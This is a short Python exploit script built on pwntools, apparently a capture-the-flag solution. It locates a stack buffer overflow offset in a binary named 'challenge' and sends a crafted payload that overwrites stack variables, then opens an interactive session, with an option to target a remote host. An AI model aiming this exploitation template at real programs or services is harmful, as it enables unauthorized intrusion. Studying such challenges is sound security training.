from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./challenge"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+165
    b *main+396
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    #offset = 
    log.info("binary loaded")
    pp.recvuntil(b"?")
    # mapping the offsets
    # pp => rbp -4 [0x7fffffffdd4c] => offset  = 28
    # fucking mypp = rbp - 0x10 = 36
    pp.sendline(b"69")
    pp.recvuntil(b"?")
    payload = flat(
        cyclic (16),
        p64(5),
        b"\x00" * 4,
        p32(727),
        # b"\x00" * 30,
            )
    pp.sendline(payload)
    pp.interactive()

if (args.REMOTE):
    libc = ELF("/usr/lib/libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
